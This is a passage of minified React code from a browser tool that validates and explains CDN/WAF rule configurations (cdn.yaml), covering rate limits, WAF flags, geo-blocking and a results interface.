t=e[1];jt.requestProperties.includes(t)||r.push({line:y,type:"value",severity:"warning",message:'Unknown request property: "'.concat(t,'"'),suggestion:"Common properties: ".concat(jt.requestProperties.slice(0,8).join(", "))})}}if(jt.operators.forEach(e=>{v.startsWith(e+":")}),v.includes("tier")&&v.includes("equals:")){const e=v.match(/equals:\s*['"]?(\w+)['"]?/);e&&!jt.tiers.includes(e[1])&&t.push({line:y,type:"value",severity:"error",message:'Invalid tier value: "'.concat(e[1],'"'),suggestion:"Valid tiers are: ".concat(jt.tiers.join(", "))})}if("wafFlags:"===v||v.includes("wafFlags:"),o&&v.startsWith("- ")&&!v.includes(":")){const e=v.replace("- ","").trim().replace(/['"]/g,"");e.match(/^[A-Z][A-Z0-9-]*$/)&&(jt.wafFlags.includes(e)||r.push({line:y,type:"value",severity:"warning",message:'Unknown WAF flag: "'.concat(e,'"'),suggestion:"Valid WAF flags include: SQLI, XSS, CMDEXE, TRAVERSAL, ATTACK, etc."}))}if(v.match(/window:\s*(\d+)/)){const e=parseInt(v.match(/window:\s*(\d+)/)[1]);(e<1||e>120)&&t.push({line:y,type:"value",severity:"error",message:"Rate limit window must be between 1 and 120 seconds, got: ".concat(e),suggestion:"Use a value between 1 and 120"})}if(v.match(/limit:\s*(\d+)/)){const e=parseInt(v.match(/limit:\s*(\d+)/)[1]);e<1&&t.push({line:y,type:"value",severity:"error",message:"Rate limit must be a positive number, got: ".concat(e),suggestion:"Use a positive integer"})}if(v.match(/count:\s*(\w+)/)){const e=v.match(/count:\s*(\w+)/)[1];jt.rateCountTypes.includes(e)||t.push({line:y,type:"value",severity:"error",message:'Invalid rate limit count type: "'.concat(e,'"'),suggestion:"Valid count types are: ".concat(jt.rateCountTypes.join(", "))})}if(v.match(/status:\s*(\d+)/)){const t=parseInt(v.match(/status:\s*(\d+)/)[1]);e.includes("redirects:")&&!jt.redirectStatuses.includes(t)&&r.push({line:y,type:"value",severity:"warning",message:"Unusual redirect status code: ".concat(t),suggestion:"Standard redirect codes are: ".concat(jt.redirectStatuses.join(", "))})}}if(o&&l){const e=R(p,u,d,l,c);t.push(...e.errors),r.push(...e.warnings)}return h.length>0&&t.push({line:h[h.length-1].line,type:"syntax",severity:"error",message:"Unclosed ".concat(h[h.length-1].char),suggestion:"Add matching closing bracket/brace"}),a.push(...O(e,n)),{isValid:0===t.filter(e=>"error"===e.severity).length,errors:t.sort((e,t)=>e.line-t.line),warnings:r.sort((e,t)=>e.line-t.line),suggestions:a,stats:{totalErrors:t.filter(e=>"error"===e.severity).length,totalWarnings:r.length,totalSuggestions:a.length}}})(e);w(t);const r=(e=>{try{y(null);const n=[],r=e.split("\n");let a=null,i=!1,s=!1,o=!1,l=!1,c=!1,u=!1;for(let e=0;e<r.length;e++){const d=r[e],p=d.trim(),h=d.search(/\S/);if(!p.includes("rules:")||p.startsWith("#")){if(i&&(p.startsWith("- name:")&&(a&&n.push(a),a={name:p.replace("- name:","").trim().replace(/['"]/g,""),conditions:[],conditionLogic:null,action:null,actionType:null,wafFlags:[],rateLimit:null,geoBlock:null,alert:!1,raw:[],lineStart:e+1,tier:null,targetProperty:null,operator:null,warnings:[],recommendations:[]},s=!1,o=!1,l=!1,c=!1,u=!1),a)){a.raw.push(d),"allOf:"===p&&(a.conditionLogic="AND",c=!0,u=!1),"anyOf:"===p&&(a.conditionLogic="OR",u=!0,c=!1);const e=p.match(/\{\s*reqProperty:\s*(\w+),?\s*(\w+)?:?\s*["']?([^"'}]+)?["']?\s*\}/);var t;if(e&&a.conditions.push({property:e[1],operator:e[2]||"equals",value:null===(t=e[3])||void 0===t?void 0:t.trim()}),p.includes("reqProperty:")&&!p.includes("{")){const e=p.replace("reqProperty:","").trim().replace(/['"]/g,"");a.targetProperty=e}if(["equals","notEquals","like","notLike","matches","in","notIn"].forEach(e=>{if(p.startsWith(e+":")&&!p.includes("{")){let t=p.replace(e+":","").trim().replace(/['"]/g,"");t.startsWith("[")&&t.endsWith("]")&&(t=t.slice(1,-1).split(",").map(e=>e.trim().replace(/['"]/g,""))),a.targetProperty&&a.conditions.push({property:a.targetProperty,operator:e,value:t}),a.operator=e}}),p.includes("tier")){const e=p.match(/equals:\s*['"]?(author|publish)['"]?/),t=p.match(/in:\s*\[.*?(author|publish).*?\]/);e&&(a.tier=e[1]),(t||p.includes('"author"')||p.includes('"publish"'))&&p.includes("author")&&p.includes("publish")&&(a.tier="both")}if(p.startsWith("action:")&&!p.includes("type")){const e=p.replace("action:","").trim().replace(/['"]/g,"");["block","log","allow"].includes(e)&&(a.action=e,a.actionType=e)}if(p.includes("type:")&&!p.includes("res_c")){const e=p.match(/type:\s*['"]?(block|log|allow)['"]?/);e&&(a.action=e[1],a.actionType=e[1])}if("wafFlags:"===p&&(s=!0,o=!1,l=!1),s&&p.startsWith("- ")&&!p.includes("name:")){const e=p.replace("- ","").trim().replace(/['"]/g,"");(pt[e]||e.match(/^[A-Z0-9-]+$/))&&a.wafFlags.push(e)}const n=p.match(/wafFlags:\s*\[\s*([^\]]+)\s*\]/);if(n){const e=n[1].split(",").map(e=>e.trim().replace(/['"]/g,""));a.wafFlags.push(...e)}if("rateLimit:"===p&&(a.rateLimit={},s=!1),null!==a.rateLimit&&(p.match(/limit:\s*\d+/)&&(a.rateLimit.limit=parseInt(p.match(/limit:\s*(\d+)/)[1])),p.match(/window:\s*\d+/)&&(a.rateLimit.window=parseInt(p.match(/window:\s*(\d+)/)[1])),p.match(/penalty:\s*\d+/)&&(a.rateLimit.penalty=parseInt(p.match(/penalty:\s*(\d+)/)[1])),p.match(/count:\s*\w+/)&&(a.rateLimit.count=p.match(/count:\s*(\w+)/)[1]),"groupBy:"===p&&(o=!0,s=!1,a.rateLimit.groupBy=[]),o&&p.startsWith("- reqProperty:")&&a.rateLimit.groupBy.push(p.replace("- reqProperty:","").trim())),"in:"===p&&"clientCountry"===a.targetProperty&&(l=!0,a.geoBlock={countries:[]}),l&&p.startsWith("- ")&&4===p.length){const e=p.replace("- ","").trim();e.match(/^[A-Z]{2}$/)&&a.geoBlock.countries.push(e)}p.match(/alert:\s*true/i)&&(a.alert=!0),h<=8&&!1===p.startsWith("- name:")&&""!==p&&!p.startsWith("-")&&p.includes(":")}}else i=!0}return a&&n.push(a),n.forEach(e=>{if(e.wafFlags.length>0&&"block"===e.action&&e.wafFlags.includes("ATTACK")&&!e.wafFlags.includes("ATTACK-FROM-BAD-IP")&&e.warnings.push("ATTACK flag in block mode may cause false positives. Consider starting with LOG mode."),e.rateLimit&&"block"===e.action&&e.recommendations.push("Consider starting rate limit rules in LOG mode to validate thresholds before blocking."),0!==e.wafFlags.length||e.rateLimit||e.geoBlock||"block"===e.action&&e.recommendations.push("This is a simple path/property blocking rule. Ensure the pattern is specific enough to avoid blocking legitimate traffic."),e.geoBlock&&e.geoBlock.countries.length>0){const t=xt.map(e=>e.code);e.geoBlock.countries.every(e=>t.includes(e))&&e.recommendations.push("Using OFAC sanctioned countries list. Verify compliance with your organization's legal requirements.")}}),n}catch(n){return console.error("Parse error:",n),y("Failed to parse YAML: ".concat(n.message)),[]}})(e);a(r);const i={total:r.length,blocking:r.filter(e=>"block"===e.action).length,logging:r.filter(e=>"log"===e.action).length,allowing:r.filter(e=>"allow"===e.action).length,wafRules:r.filter(e=>e.wafFlags.length>0).length,rateLimitRules:r.filter(e=>e.rateLimit).length,geoBlockRules:r.filter(e=>e.geoBlock).length,withAlerts:r.filter(e=>e.alert).length,uniqueWafFlags:[...new Set(r.flatMap(e=>e.wafFlags))],coverage:F(r)};x(i),t.errors.filter(e=>"error"===e.severity).length>0?j("validation"):j("analysis")},children:[(0,i.jsxs)("svg",{width:"18",height:"18",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("circle",{cx:"11",cy:"11",r:"8"}),(0,i.jsx)("path",{d:"m21 21-4.35-4.35"})]}),"Analyze & Validate"]})]}),(0,i.jsxs)("div",{className:"results-panel",children:[b&&(0,i.jsxs)("div",{className:"validation-banner ".concat(b.isValid?"valid":"invalid"),children:[(0,i.jsx)("div",{className:"validation-status",children:b.isValid?(0,i.jsxs)(i.Fragment,{children:[(0,i.jsxs)("svg",{width:"24",height:"24",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("path",{d:"M22 11.08V12a10 10 0 1 1-5.93-9.14"}),(0,i.jsx)("polyline",{points:"22 4 12 14.01 9 11.01"})]}),(0,i.jsx)("span",{children:"Configuration is valid"})]}):(0,i.jsxs)(i.Fragment,{children:[(0,i.jsxs)("svg",{width:"24",height:"24",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("circle",{cx:"12",cy:"12",r:"10"}),(0,i.jsx)("line",{x1:"15",y1:"9",x2:"9",y2:"15"}),(0,i.jsx)("line",{x1:"9",y1:"9",x2:"15",y2:"15"})]}),(0,i.jsx)("span",{children:"Configuration has issues"})]})}),(0,i.jsxs)("div",{className:"validation-counts",children:[(0,i.jsxs)("span",{className:"count-error",children:[b.stats.totalErrors," errors"]}),(0,i.jsxs)("span",{className:"count-warning",children:[b.stats.totalWarnings," warnings"]}),(0,i.jsxs)("span",{className:"count-suggestion",children:[b.stats.totalSuggestions," suggestions"]})]})]}),(b||v||e.trim())&&(0,i.jsxs)("div",{className:"results-tabs",children:[(0,i.jsxs)("button",{className:"tab-btn ".concat("validation"===k?"active":""),onClick:()=>j("validation"),children:[(0,i.jsxs)("svg",{width:"16",height:"16",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("path",{d:"M9 11l3 3L22 4"}),(0,i.jsx)("path",{d:"M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"})]}),"Validation",b&&b.stats.totalErrors>0&&(0,i.jsx)("span",{className:"tab-badge error",children:b.stats.totalErrors})]}),(0,i.jsxs)("button",{className:"tab-btn ".concat("analysis"===k?"active":""),onClick:()=>j("analysis"),children:[(0,i.jsxs)("svg",{width:"16",height:"16",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("circle",{cx:"11",cy:"11",r:"8"}),(0,i.jsx)("path",{d:"m21 21-4.35-4.35"})]}),"Analysis",v&&(0,i.jsx)("span",{className:"tab-badge",children:v.total})]}),(0,i.jsxs)("button",{className:"tab-btn ".concat("format"===k?"active":""),onClick:()=>j("format"),children:[(0,i.jsxs)("svg",{width:"16",height:"16",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("path",{d:"M4 7V4h16v3"}),(0,i.jsx)("path",{d:"M9 20h6"}),(0,i.jsx)("path",{d:"M12 4v16"})]}),"Format"]})]}),"validation"===k&&b&&(0,i.jsxs)("div",{className:"validation-results animate-slide-up",children:[b.errors.length>0&&(0,i.jsxs)("div",{className:"validation-section errors-section",children:[(0,i.jsxs)("h4",{className:"section-title error-title",children:[(0,i.jsxs)("svg",{width:"18",height:"18",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("circle",{cx:"12",cy:"12",r:"10"}),(0,i.jsx)("line",{x1:"15",y1:"9",x2:"9",y2:"15"}),(0,i.jsx)("line",{x1:"9",y1:"9",x2:"15",y2:"15"})]}),"Errors (",b.errors.filter(e=>"error"===e.severity).length,")"]}),(0,i.jsx)("div",{className:"validation-list",children:b.errors.filter(e=>"error"===e.severity).map((e,t)=>(0,i.jsxs)("div",{className:"validation-item ".concat(H(e.severity)),children:[(0,i.jsxs)("div",{className:"validation-item-header",children:[(0,i.jsx)("span",{className:"validation-icon",children:W(e.severity)}),(0,i.jsxs)("span",{className:"validation-line",children:["Line ",e.line]}),(0,i.jsx)("span",{className:"validation-type",children:e.type})]}),(0,i.jsx)("div",{className:"validation-message",children:e.message}),e.suggestion&&(0,i.jsxs)("div",{className:"validation-suggestion",children:[(0,i.jsx)("span",{className:"suggestion-label",children:"\ud83d\udca1 Fix:"})," ",e.suggestion]})]},t))})]}),b.warnings.length>0&&(0,i.jsxs)("div",{className:"validation-section warnings-section",children:[(0,i.jsxs)("h4",{className:"section-title warning-title",children:[(0,i.jsxs)("svg",{width:"18",height:"18",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("path",{d:"M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"}),(0,i.jsx)("line",{x1:"12",y1:"9",x2:"12",y2:"13"}),(0,i.jsx)("line",{x1:"12",y1:"17",x2:"12.01",y2:"17"})]}),"Warnings (",b.warnings.length,")"]}),(0,i.jsx)("div",{className:"validation-list",children:b.warnings.map((e,t)=>(0,i.jsxs)("div",{className:"validation-item ".concat(H(e.severity)),children:[(0,i.jsxs)("div",{className:"validation-item-header",children:[(0,i.jsx)("span",{className:"validation-icon",children:W(e.severity)}),(0,i.jsxs)("span",{className:"validation-line",children:["Line ",e.line]}),(0,i.jsx)("span",{className:"validation-type",children:e.type})]}),(0,i.jsx)("div",{className:"validation-message",children:e.message}),e.suggestion&&(0,i.jsxs)("div",{className:"validation-suggestion",children:[(0,i.jsx)("span",{className:"suggestion-label",children:"\ud83d\udca1 Suggestion:"})," ",e.suggestion]})]},t))})]}),b.suggestions.length>0&&(0,i.jsxs)("div",{className:"validation-section suggestions-section",children:[(0,i.jsxs)("h4",{className:"section-title suggestion-title",children:[(0,i.jsxs)("svg",{width:"18",height:"18",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("circle",{cx:"12",cy:"12",r:"10"}),(0,i.jsx)("path",{d:"M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"}),(0,i.jsx)("line",{x1:"12",y1:"17",x2:"12.01",y2:"17"})]}),"Best Practice Suggestions (",b.suggestions.length,")"]}),(0,i.jsx)("div",{className:"validation-list",children:b.suggestions.map((e,t)=>(0,i.jsxs)("div",{className:"validation-item ".concat(H(e.severity)),children:[(0,i.jsxs)("div",{className:"validation-item-header",children:[(0,i.jsx)("span",{className:"validation-icon",children:W(e.severity)}),(0,i.jsx)("span",{className:"validation-type",children:e.type})]}),(0,i.jsx)("div",{className:"validation-message",children:e.message}),e.suggestion&&(0,i.jsxs)("div",{className:"validation-suggestion",children:[(0,i.jsx)("span",{className:"suggestion-label",children:"\ud83d\udca1 Recommendation:"})," ",e.suggestion]})]},t))})]}),b.isValid&&0===b.errors.length&&0===b.warnings.length&&(0,i.jsxs)("div",{className:"validation-success",children:[(0,i.jsxs)("svg",{width:"48",height:"48",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("path",{d:"M22 11.08V12a10 10 0 1 1-5.93-9.14"}),(0,i.jsx)("polyline",{points:"22 4 12 14.01 9 11.01"})]}),(0,i.jsx)("h3",{children:"Configuration looks good! \ud83c\udf89"}),(0,i.jsx)("p",{children:"No syntax errors or warnings detected. Your cdn.yaml is ready for deployment."})]})]}),"analysis"===k&&(0,i.jsxs)(i.Fragment,{children:[v&&(0,i.jsxs)("div",{className:"stats-panel animate-slide-up",children:[(0,i.jsxs)("div",{className:"stats-header",children:[(0,i.jsx)("h3",{children:"Analysis Summary"}),z()&&(0,i.jsxs)("div",{className:"security-score",children:[(0,i.jsx)("span",{className:"score-label",children:"Security Score"}),(0,i.jsxs)("span",{className:"score-value ".concat(z().score>=70?"good":z().score>=40?"medium":"low"),children:[z().score,"/",z().maxScore]})]})]}),(0,i.jsxs)("div",{className:"stats-grid",children:[(0,i.jsxs)("div",{className:"stat-item",children:[(0,i.jsx)("span",{className:"stat-value",children:v.total}),(0,i.jsx)("span",{className:"stat-label",children:"Total Rules"})]}),(0,i.jsxs)("div",{className:"stat-item blocking",children:[(0,i.jsx)("span",{className:"stat-value",children:v.blocking}),(0,i.jsx)("span",{className:"stat-label",children:"Blocking"})]}),(0,i.jsxs)("div",{className:"stat-item logging",children:[(0,i.jsx)("span",{className:"stat-value",children:v.logging}),(0,i.jsx)("span",{className:"stat-label",children:"Logging"})]}),(0,i.jsxs)("div",{className:"stat-item waf",children:[(0,i.jsx)("span",{className:"stat-value",children:v.wafRules}),(0,i.jsx)("span",{className:"stat-label",children:"WAF Rules"})]}),(0,i.jsxs)("div",{className:"stat-item rate",children:[(0,i.jsx)("span",{className:"stat-value",children:v.rateLimitRules}),(0,i.jsx)("span",{className:"stat-label",children:"Rate Limits"})]}),(0,i.jsxs)("div",{className:"stat-item geo",children:[(0,i.jsx)("span",{className:"stat-value",children:v.geoBlockRules}),(0,i.jsx)("span",{className:"stat-label",children:"Geo-Block"})]})]}),v.coverage.missing.length>0&&(0,i.jsxs)("div",{className:"coverage-warning",children:[(0,i.jsx)("strong",{children:"\u26a0\ufe0f WAF Coverage Gap:"})," ",v.coverage.used,"/",v.coverage.total," flags used (",v.coverage.percentage,"%)",(0,i.jsxs)("div",{className:"missing-flags",children:["Missing: ",v.coverage.missing.slice(0,5).join(", "),v.coverage.missing.length>5&&" and ".concat(v.coverage.missing.length-5," more")]})]})]}),n.length>0?(0,i.jsxs)("div",{className:"rules-list",children:[(0,i.jsxs)("div",{className:"rules-search-bar",children:[(0,i.jsxs)("div",{className:"search-input-wrapper",children:[(0,i.jsxs)("svg",{width:"18",height:"18",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("circle",{cx:"11",cy:"11",r:"8"}),(0,i.jsx)("path",{d:"m21 21-4.35-4.35"})]}),(0,i.jsx)("input",{type:"text",className:"search-input",placeholder:"Search rules by name, flag, action, condition...",value:l,onChange:e=>c(e.target.value)}),l&&(0,i.jsx)("button",{className:"clear-search",onClick:()=>c(""),children:"\xd7"})]}),(0,i.jsxs)("div",{className:"filter-buttons",children:[(0,i.jsxs)("button",{className:"filter-btn ".concat("all"===u?"active":""),onClick:()=>d("all"),children:["All (",n.length,")"]}),(0,i.jsxs)("button",{className:"filter-btn waf ".concat("waf"===u?"active":""),onClick:()=>d("waf"),children:["\ud83d\udee1\ufe0f WAF (",n.filter(e=>e.wafFlags.length>0).length,")"]}),(0,i.jsxs)("button",{className:"filter-btn rate ".concat("rateLimit"===u?"active":""),onClick:()=>d("rateLimit"),children:["\u23f1\ufe0f Rate Limit (",n.filter(e=>e.rateLimit).length,")"]}),(0,i.jsxs)("button",{className:"filter-btn geo ".concat("geoBlock"===u?"active":""),onClick:()=>d("geoBlock"),children:["\ud83c\udf0d Geo (",n.filter(e=>e.geoBlock).length,")"]}),(0,i.jsxs)("button",{className:"filter-btn traffic ".concat("trafficFilter"===u?"active":""),onClick:()=>d("trafficFilter"),children:["\ud83d\udd12 Traffic (",n.filter(e=>!e.wafFlags.length&&!e.rateLimit&&!e.geoBlock).length,")"]})]})]}),(0,i.jsxs)("div",{className:"results-header",children:[(0,i.jsx)("h3",{children:(()=>{const e=n.filter(e=>{var t,n;if("waf"===u&&0===e.wafFlags.length)return!1;if("rateLimit"===u&&!e.rateLimit)return!1;if("geoBlock"===u&&!e.geoBlock)return!1;if("trafficFilter"===u&&(e.wafFlags.length>0||e.rateLimit||e.geoBlock))return!1;if(!l.trim())return!0;const r=l.toLowerCase();return(null===(t=e.name)||void 0===t?void 0:t.toLowerCase().includes(r))||(null===(n=e.action)||void 0===n?void 0:n.toLowerCase().includes(r))||e.wafFlags.some(e=>e.toLowerCase().includes(r))||e.conditions.some(e=>{var t,n;return(null===(t=e.property)||void 0===t?void 0:t.toLowerCase().includes(r))||(null===(n=String(e.value))||void 0===n?void 0:n.toLowerCase().includes(r))})||e.tier&&e.tier.toLowerCase().includes(r)});return"".concat(e.length," of ").concat(n.length," Rule").concat(1!==n.length?"s":""," ").concat(l||"all"!==u?"(filtered)":"Analyzed")})()}),(l||"all"!==u)&&(0,i.jsx)("button",{className:"btn btn-ghost btn-sm",onClick:()=>{c(""),d("all")},children:"Clear Filters"})]}),n.filter(e=>{var t,n;if("waf"===u&&0===e.wafFlags.length)return!1;if("rateLimit"===u&&!e.rateLimit)return!1;if("geoBlock"===u&&!e.geoBlock)return!1;if("trafficFilter"===u&&(e.wafFlags.length>0||e.rateLimit||e.geoBlock))return!1;if(!l.trim())return!0;const r=l.toLowerCase();return(null===(t=e.name)||void 0===t?void 0:t.toLowerCase().includes(r))||(null===(n=e.action)||void 0===n?void 0:n.toLowerCase().includes(r))||e.wafFlags.some(e=>e.toLowerCase().includes(r))||e.conditions.some(e=>{var t,n;return(null===(t=e.property)||void 0===t?void 0:t.toLowerCase().includes(r))||(null===(n=String(e.value))||void 0===n?void 0:n.toLowerCase().includes(r))})||e.tier&&e.tier.toLowerCase().includes(r)}).map((e,t)=>{const n=I(e);return(0,i.jsxs)("div",{className:"rule-card card animate-slide-up",style:{animationDelay:"".concat(50*t,"ms")},children:[(0,i.jsxs)("div",{className:"rule-header",children:[(0,i.jsxs)("div",{className:"rule-title",children:[(0,i.jsx)("span",{className:"rule-icon",children:n.icon}),(0,i.jsxs)("span",{className:"rule-number",children:["#",t+1]}),(0,i.jsx)("code",{className:"rule-name",children:e.name}),(0,i.jsxs)("span",{className:"rule-line-info",children:["Line ",e.lineStart]})]}),(0,i.jsxs)("div",{className:"rule-badges",children:[(0,i.jsx)("span",{className:"badge badge-".concat(n.color),children:n.type}),e.action&&(0,i.jsx)("span",{className:"badge badge-".concat("block"===e.action?"red":"log"===e.action?"blue":"green"),children:e.action.toUpperCase()}),e.alert&&(0,i.jsx)("span",{className:"badge badge-orange",children:"\ud83d\udd14 Alert"})]})]}),(e.warnings.length>0||e.recommendations.length>0)&&(0,i.jsxs)("div",{className:"rule-alerts",children:[e.warnings.map((e,t)=>(0,i.jsxs)("div",{className:"alert-item warning",children:[(0,i.jsx)("span",{className:"alert-icon",children:"\u26a0\ufe0f"}),e]},t)),e.recommendations.map((e,t)=>(0,i.jsxs)("div",{className:"alert-item recommendation",children:[(0,i.jsx)("span",{className:"alert-icon",children:"\ud83d\udca1"}),e]},t))]}),(0,i.jsx)("div",{className:"rule-summary-box",children:(0,i.jsx)("p",{className:"summary-content",children:M(e)})}),(0,i.jsxs)("details",{className:"rule-explanation-accordion",children:[(0,i.jsxs)("summary",{className:"accordion-header",children:[(0,i.jsx)("span",{className:"accordion-icon",children:"\ud83d\udcd6"}),(0,i.jsx)("span",{className:"accordion-title",children:"Detailed Explanation"}),(0,i.jsx)("svg",{className:"accordion-chevron",width:"20",height:"20",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:(0,i.jsx)("polyline",{points:"6 9 12 15 18 9"})})]}),(0,i.jsx)("div",{className:"accordion-content",children:(0,i.jsx)("div",{className:"explanation-content",dangerouslySetInnerHTML:{__html:D(e).replace(/\*\*([^*]+)\*\*/g,"<strong>$1</strong>").replace(/\n/g,"<br/>")}})})]}),e.wafFlags.length>0&&(0,i.jsxs)("div",{className:"rule-flags",children:[(0,i.jsx)("h4",{children:"WAF Protections Enabled"}),(0,i.jsx)("div",{className:"flag-cards",children:e.wafFlags.map(e=>{var t,n;const r=pt[e];return(0,i.jsxs)("div",{className:"flag-card",children:[(0,i.jsxs)("div",{className:"flag-card-header",children:[(0,i.jsx)("code",{className:"flag-name",children:e}),r&&(0,i.jsx)("span",{className:"flag-severity",style:{background:null===(t=ht[r.severity])||void 0===t?void 0:t.bg,color:null===(n=ht[r.severity])||void 0===n?void 0:n.color},children:r.severity})]}),r&&(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)("p",{className:"flag-desc",children:r.description}),(0,i.jsxs)("p",{className:"flag-mitigates",children:[(0,i.jsx)("strong",{children:"Mitigates:"})," ",r.mitigates]})]})]},e)})})]}),B(e).length>0&&(0,i.jsxs)("div",{className:"rule-examples",children:[(0,i.jsx)("h4",{children:"Attack Patterns That Trigger This Rule"}),(0,i.jsx)("div",{className:"examples-table",children:(0,i.jsxs)("table",{className:"table",children:[(0,i.jsx)("thead",{children:(0,i.jsxs)("tr",{children:[(0,i.jsx)("th",{children:"Attack Pattern"}),(0,i.jsx)("th",{children:"WAF Flag"}),(0,i.jsx)("th",{children:"Attack Type"}),(0,i.jsx)("th",{children:"Severity"})]})}),(0,i.jsx)("tbody",{children:B(e).slice(0,6).map((e,t)=>{var n,r;return(0,i.jsxs)("tr",{children:[(0,i.jsx)("td",{children:(0,i.jsx)("code",{className:"attack-example",children:e.attack})}),(0,i.jsx)("td",{children:(0,i.jsx)("code",{className:"code-inline",children:e.flag})}),(0,i.jsx)("td",{children:e.type}),(0,i.jsx)("td",{children:(0,i.jsx)("span",{className:"badge",style:{background:null===(n=ht[e.severity])||void 0===n?void 0:n.bg,color:null===(r=ht[e.severity])||void 0===r?void 0:r.color},children:e.severity})})]},t)})})]})})]}),e.rateLimit&&(0,i.jsxs)("div",{className:"rule-rate-limit",children:[(0,i.jsx)("h4",{children:"Rate Limit Configuration"}),(0,i.jsxs)("div",{className:"rate-limit-visual",children:[(0,i.jsxs)("div",{className:"rate-limit-item",children:[(0,i.jsx)("div",{className:"rate-limit-icon",children:"\ud83d\udcca"}),(0,i.jsxs)("div",{className:"rate-limit-content",children:[(0,i.jsx)("span",{className:"rate-limit-value",children:e.rateLimit.limit}),(0,i.jsx)("span",{className:"rate-limit-label",children:"req/sec"})]})]}),(0,i.jsx)("div",{className:"rate-limit-arrow",children:"\xd7"}),(0,i.jsxs)("div",{className:"rate-limit-item",children:[(0,i.jsx)("div",{className:"rate-limit-icon",children:"\u23f1\ufe0f"}),(0,i.jsxs)("div",{className:"rate-limit-content",children:[(0,i.jsxs)("span",{className:"rate-limit-value",children:[e.rateLimit.window,"s"]}),(0,i.jsx)("span",{className:"rate-limit-label",children:"window"})]})]}),(0,i.jsx)("div",{className:"rate-limit-arrow",children:"="}),(0,i.jsxs)("div",{className:"rate-limit-item calculated",children:[(0,i.jsx)("div",{className:"rate-limit-icon",children:"\ud83d\udcc8"}),(0,i.jsxs)("div",{className:"rate-limit-content",children:[(0,i.jsx)("span",{className:"rate-limit-value",children:(e.rateLimit.limit*e.rateLimit.window).toLocaleString()}),(0,i.jsx)("span",{className:"rate-limit-label",children:"total allowed"})]})]}),e.rateLimit.penalty&&(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)("div",{className:"rate-limit-arrow",children:"\u2192"}),(0,i.jsxs)("div",{className:"rate-limit-item penalty",children:[(0,i.jsx)("div",{className:"rate-limit-icon",children:"\ud83d\udeab"}),(0,i.jsxs)("div",{className:"rate-limit-content",children:[(0,i.jsxs)("span",{className:"rate-limit-value",children:[e.rateLimit.penalty,"s"]}),(0,i.jsx)("span",{className:"rate-limit-label",children:"block penalty"})]})]})]})]}),(0,i.jsxs)("p",{className:"rate-limit-summary",children:[(0,i.jsx)("strong",{children:"How it works:"})," ",e.rateLimit.limit," req/sec \xd7 ",e.rateLimit.window,"s = ",(0,i.jsxs)("strong",{children:[(e.rateLimit.limit*e.rateLimit.window).toLocaleString()," total requests"]})," allowed in the window.",(0,i.jsx)("br",{}),"fetches"===e.rateLimit.count?"\ud83d\udccc Only counting requests that reach origin (cache misses)":"errors"===e.rateLimit.count?"\ud83d\udccc Only counting error responses (4xx, 5xx)":"\ud83d\udccc Counting all requests including cached responses"]})]}),e.geoBlock&&e.geoBlock.countries.length>0&&(0,i.jsxs)("div",{className:"rule-geo-block",children:[(0,i.jsx)("h4",{children:"\ud83c\udf0d Geographic Restrictions"}),(0,i.jsx)("div",{className:"country-list",children:e.geoBlock.countries.map(e=>{const t=xt.find(t=>t.code===e);return(0,i.jsx)("span",{className:"country-badge",children:t?"".concat(t.name," (").concat(e,")"):e},e)})})]})]},t)})]}):(0,i.jsxs)("div",{className:"empty-state",children:[(0,i.jsxs)("svg",{width:"64",height:"64",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"1.5",children:[(0,i.jsx)("circle",{cx:"11",cy:"11",r:"8"}),(0,i.jsx)("path",{d:"m21 21-4.35-4.35"})]}),(0,i.jsx)("h3",{children:"No Rules Analyzed Yet"}),(0,i.jsx)("p",{children:'Paste your cdn.yaml configuration and click "Analyze & Validate" to see a detailed breakdown.'}),(0,i.jsx)("p",{className:"hint",children:'\ud83d\udca1 Click "Load Sample" to try with Adobe\'s recommended starter rules, or check "Examples" for common patterns.'})]})]}),"format"===k&&(0,i.jsxs)("div",{className:"format-tab animate-slide-up",children:[(0,i.jsxs)("div",{className:"format-header",children:[(0,i.jsx)("h3",{children:"YAML Formatter & Tools"}),(0,i.jsx)("p",{children:"Format, minify, and organize your cdn.yaml configuration"})]}),N&&(0,i.jsxs)("div",{className:"format-message ".concat(N.type),children:["success"===N.type?(0,i.jsxs)("svg",{width:"18",height:"18",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("path",{d:"M22 11.08V12a10 10 0 1 1-5.93-9.14"}),(0,i.jsx)("polyline",{points:"22 4 12 14.01 9 11.01"})]}):(0,i.jsxs)("svg",{width:"18",height:"18",viewBox:"0 0 24 